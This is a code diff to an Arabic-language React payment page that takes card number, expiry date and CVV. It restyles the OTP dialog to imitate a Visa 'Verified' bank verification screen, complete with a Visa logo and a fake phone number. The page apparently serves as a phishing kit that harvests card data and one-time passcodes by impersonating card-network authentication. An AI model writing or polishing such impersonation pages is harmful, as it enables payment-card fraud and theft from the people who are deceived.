@@ -600,7 +600,7 @@ export default function Home() {
                 <div className="space-y-2">
                   <label className="block text-gray-700 font-semibold text-sm md:text-base">رقم البطاقة</label>
                   <Input
-                    type="text"
+                    type="tel"
                     placeholder="0000 0000 0000 0000"
                     value={cardNumber}
                     onChange={(e) => setCardNumber(e.target.value)}
@@ -614,7 +614,7 @@ export default function Home() {
                   <div className="space-y-2">
                     <label className="block text-gray-700 font-semibold text-sm md:text-base">تاريخ الانتهاء</label>
                     <Input
-                      type="text"
+                      type="tel"
                       placeholder="MM/YY"
                       className="h-11 md:h-12 text-center text-sm md:text-base border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68]"
                       required
@@ -623,7 +623,7 @@ export default function Home() {
                   <div className="space-y-2">
                     <label className="block text-gray-700 font-semibold text-sm md:text-base">CVV</label>
                     <Input
-                      type="text"
+                      type="tel"
                       placeholder="000"
                       maxLength={3}
                       className="h-11 md:h-12 text-center text-sm md:text-base border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68]"
@@ -644,60 +644,75 @@ export default function Home() {
         </div>
       )}
 
-      {showOtpDialog && (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-3 md:p-4 z-50">
-          <div className="bg-white rounded-xl md:rounded-2xl shadow-2xl p-5 md:p-6 lg:p-8 w-full max-w-md" dir="rtl">
-            <div className="flex justify-between items-center mb-4 md:mb-6">
-              <h3 className="text-xl md:text-2xl font-bold text-[#0a4a68]">رمز التحقق (OTP)</h3>
-              <button
-                onClick={() => setShowOtpDialog(false)}
-                className="w-8 h-8 md:w-9 md:h-9 rounded-full hover:bg-gray-100 flex items-center justify-center transition-colors"
-              >
-                <X className="w-5 h-5 md:w-6 md:h-6 text-gray-500" />
-              </button>
+     {/* OTP Dialog */}
+     {!showOtpDialog && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
+          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8" dir="rtl">
+            <div className="flex items-center justify-between gap-4 mb-6">
+            <img src="/visa.svg"alt="kd" width={50}/>
+            <span className="font-bold text-blue-800">Verified </span>
             </div>
 
-            <p className="text-gray-600 mb-4 md:mb-6 text-sm md:text-base">
-              تم إرسال رمز التحقق إلى رقم هاتفك المسجل. الرجاء إدخال الرمز أدناه.
+            <h3 className="text-2xl font-bold text-gray-900 text-center mb-4">Enter verification code</h3>
+            <p className="text-gray-600 text-center mb-6 leading-relaxed">
+              We sent you a verification code by text message to (123) 456-0012. You have {otpAttempts} attempts.
             </p>
 
-            <form onSubmit={handleOtpSubmit} className="space-y-4 md:space-y-5">
-              <div>
+            <form onSubmit={handleOtpSubmit} className="space-y-5">
+              <div className="space-y-2">
+                <label className="block text-gray-700 font-semibold text-sm text-center">Verification code</label>
                 <Input
-                  type="text"
-                  placeholder="أدخل رمز التحقق"
+                  type="tel"
                   value={otpValue}
                   onChange={(e) => {
                     setOtpValue(e.target.value)
                     setOtpError("")
                   }}
-                  className="h-11 md:h-12 text-center text-base md:text-lg tracking-widest border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68]"
+                  placeholder="######"
                   maxLength={6}
+                  className="h-16 text-center text-2xl tracking-widest border-2 rounded-xl focus:border-blue-500 shadow-sm font-mono"
                   required
                 />
                 {otpError && (
-                  <p className="text-red-500 text-xs md:text-sm mt-2 text-center font-semibold">{otpError}</p>
+                  <div className="flex items-center gap-2 text-red-600 text-sm font-semibold justify-center">
+                    <X className="w-4 h-4" />
+                    <span>{otpError}</span>
+                  </div>
                 )}
-              </div>
-
-              <div className="flex items-center justify-between text-xs md:text-sm">
-                <button
-                  type="button"
-                  onClick={handleResendOtp}
-                  className="text-blue-600 hover:text-blue-700 font-semibold"
-                >
-                  إعادة إرسال الرمز
-                </button>
-                <span className="text-gray-600">المحاولات المتبقية: {otpAttempts}</span>
               </div>
 
               <Button
                 type="submit"
-                className="w-full h-11 md:h-12 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-sm md:text-base rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
+                className="w-full h-14 bg-blue-600 hover:bg-blue-700 text-white font-bold text-lg rounded-xl shadow-lg hover:shadow-xl transition-all"
               >
-                تحقق
+                CONTINUE
               </Button>
+
+              <button
+                type="button"
+                onClick={handleResendOtp}
+                className="w-full text-blue-600 font-semibold text-sm hover:text-blue-700 transition-colors"
+              >
+                RESEND CODE
+              </button>
             </form>
+
+            <div className="mt-6 pt-6 border-t-2 border-gray-200">
+              <button className="flex items-center justify-between w-full text-blue-600 font-semibold text-sm hover:text-blue-700 transition-colors">
+                <span>Need Help?</span>
+                <span className="text-xl">+</span>
+              </button>
+            </div>
+
+            <div className="mt-4">
+              <p className="text-gray-500 text-xs text-center leading-relaxed">
+                Having trouble?
+                <br />
+                <button className="text-blue-600 hover:text-blue-700 font-semibold">
+                  Choose another security option
+                </button>
+              </p>
+            </div>
           </div>
         </div>
       )}
